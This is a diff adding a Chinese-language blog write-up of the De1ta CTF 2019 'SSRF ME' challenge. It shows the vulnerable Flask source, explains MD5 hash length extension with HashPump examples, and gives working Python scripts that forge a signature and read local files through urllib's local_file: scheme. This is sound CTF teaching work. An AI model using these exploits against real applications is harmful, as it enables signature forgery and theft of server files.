@@ -1,0 +1,526 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>De1ta CTF 2019 Web Writeup | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="De1ta CTF 2019 Web Writeup | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="SSRF ME
+题目分析
+题目源代码:
+#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import sock..." />
+    <meta name="keywords" content="SSRF,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              De1ta CTF 2019 Web Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-08-23
+              </span>
+              <span>
+                10 min read
+              </span>
+              <span class="page-view" key="20190823105952" title="De1ta CTF 2019 Web Writeup">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ssrf/" class="post-tag">
+                  # SSRF
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <h2 id="ssrf-me">SSRF ME</h2>
+<h3 id="题目分析">题目分析</h3>
+<p>题目源代码:</p>
+<pre><code class="language-python">#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):         
+            #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = &quot;Action Error&quot;
+        else:
+            result['code'] = 500
+            result['msg'] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+
+@app.route('/')
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0',port=80) 
+</code></pre>
+<ul>
+<li>路由分析</li>
+</ul>
+<pre><code class="language-python">#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+</code></pre>
+<p>访问<code>/geneSign</code> -&gt; 调用genSign(action=&quot;scan&quot;,param)-&gt;返回md5(secert_key+param+action=&quot;scan&quot;)，其中secert_key=os.urandom(16)不可知，参数param可通过GET方法传值。</p>
+<pre><code class="language-python">@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+</code></pre>
+<p>路由<code>/De1ta</code>接收参数action、param、sign，<code>waf()</code>函数对<code>gopher</code>、<code>file</code>文件读取协议进行了过滤，实例化类Task为task，执行task.Exec()。</p>
+<pre><code class="language-python">class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):         
+            #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = &quot;Action Error&quot;
+        else:
+            result['code'] = 500
+            result['msg'] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+</code></pre>
+<pre><code class="language-python">Exec() -&gt; checkSign() -&gt; scan &amp; read in action 则对param进行文件读取并返回文件内容。
+</code></pre>
+<p>我们可以通过<code>/genSign</code>获取到<code>md5(secret_key+param+'scan')</code>要构造出<code>md5(secret_key+param+'scanread</code>)，其中<code>urlopen(param)</code>对flag.txt进行读取。</p>
+<h3 id="local_file">local_file://</h3>
+<blockquote>
+<p><a href="https://bugs.python.org/issue35907">CVE-2019-9948 Unnecessary URL scheme exists to allow local_file:// reading file in urllib</a></p>
+</blockquote>
+<p>这里可以使用<code>local_file:flag.txt</code>进行读取flag。</p>
+<blockquote>
+<p>直接 urlopen(flag.txt) 也可以成功读取到flag.</p>
+</blockquote>
+<h3 id="哈希长度拓展">哈希长度拓展</h3>
+<blockquote>
+<p><a href="https://www.cnblogs.com/pcat/p/5478509.html">哈希长度扩展攻击的简介以及HashPump安装使用方法</a></p>
+</blockquote>
+<p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</p>
+<p>如果一个应用程序是这样操作的：</p>
+<ol>
+<li>准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）</li>
+<li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li>
+<li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li>
+</ol>
+<p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。</p>
+<p>&gt; <strong>几种工具的使用方法:</strong></p>
+<ol>
+<li>HashPump</li>
+</ol>
+<pre><code class="language-bash">secret = &quot;********&quot;; //8
+username = &quot;admin&quot;; //5
+password = &quot;admin&quot;; //5
+md5(secret.username.password) = 52107b08c0f3342d2153ae1d68e6262c
+=&gt; md5(secret + 'admin' + 'admin'...+'3nd')
+</code></pre>
+<pre><code class="language-bash">$ hashpump
+Input Signature: 52107b08c0f3342d2153ae1d68e6262c //已知的签名
+Input Data: admin  //数据(password)
+Input Key Length: 13 //密文固定长度 secret.username
+Input Data to Add: 3nd  //拓展字段
+b434e6bafe2a80ddb42d515d98a1b6f2 //拓展后获取的签名
+admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x003nd //拓展后的数据
+Payload 中需替换 \x 为 %
+admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%003nd 
+</code></pre>
+<pre><code class="language-bash">$ hashpump -s 52107b08c0f3342d2153ae1d68e6262c -d admin -k 13 -a 3nd
+b434e6bafe2a80ddb42d515d98a1b6f2
+admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x003nd
+</code></pre>
+<ol start="2">
+<li>hashpump (python)</li>
+</ol>
+<pre><code class="language-python">import urllib
+import hashpumpy
+
+hash = '52107b08c0f3342d2153ae1d68e6262c'
+ext = hashpumpy.hashpump(hash, 'admin', '3nd', 13)
+print ext[0]
+print urllib.quote(ext[1])
+'''
+b434e6bafe2a80ddb42d515d98a1b6f2
+admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%003nd
+'''
+</code></pre>
+<ol start="3">
+<li><a href="https://github.com/JoyChou93/md5-extension-attack">md5pad</a></li>
+</ol>
+<p>md5pad.py &lt;md5string&gt; &lt;string_to_append&gt; [length of plaintext of md5string]</p>
+<pre><code class="language-bash">$ python md5pad.py 52107b08c0f3342d2153ae1d68e6262c 3nd 18
+Payload:  '\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x003nd'
+Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%003nd
+md5: b434e6bafe2a80ddb42d515d98a1b6f2
+</code></pre>
+<hr>
+<p>Payload:</p>
+<pre><code class="language-python">import hashpumpy
+import requests
+import urllib
+
+url = 'http://7ddeea64-4b71-4c8d-85e9-798ada53395c.node1.buuoj.cn'
+param = 'local_file:flag.txt'
+r = requests.get(url+'/geneSign?param='+param)
+sign = r.text
+hash_sign = hashpumpy.hashpump(sign, param + 'scan', 'read', 16)
+cookies={
+    'sign': hash_sign[0],
+    'action': urllib.quote(hash_sign[1][len(param):])
+}
+r = requests.get(url+'/De1ta?param='+param, cookies=cookies)
+
+print r.content
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-23-10-42-04.png" alt="" loading="lazy"></figure>
+<h3 id="利用gensign">利用genSign</h3>
+<pre><code class="language-python">1./geneSign -&gt; md5(secret_key+param=&quot;local_file:flag.txtread'+action='scan')
+2./De1ta -&gt; param = &quot;local_file:flag.txt&quot; &amp; action='readscan' -&gt; Exec()
+</code></pre>
+<pre><code class="language-python">import requests
+
+url = 'http://7ddeea64-4b71-4c8d-85e9-798ada53395c.node1.buuoj.cn'
+param = 'local_file:flag.txt'
+r = requests.get(url+'/geneSign?param='+param+'read')
+sign = r.text
+cookies={
+    'sign': sign,
+    'action': 'readscan'
+}
+r = requests.get(url+'/De1ta?param='+param, cookies=cookies)
+
+print r.content
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-23-10-46-16.png" alt="" loading="lazy"></figure>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#ssrf-me">SSRF ME</a>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#local_file">local_file://</a></li>
+<li><a href="#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95">哈希长度拓展</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8gensign">利用genSign</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-30-500th-zone-ctf-web/">
+                <h3 class="post-title" style="text-align: left;">
+                  第五空间网络安全大赛Web Writeup
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-22-ssrf-learning-note/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  SSRF 服务端请求伪造漏洞与利用学习
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
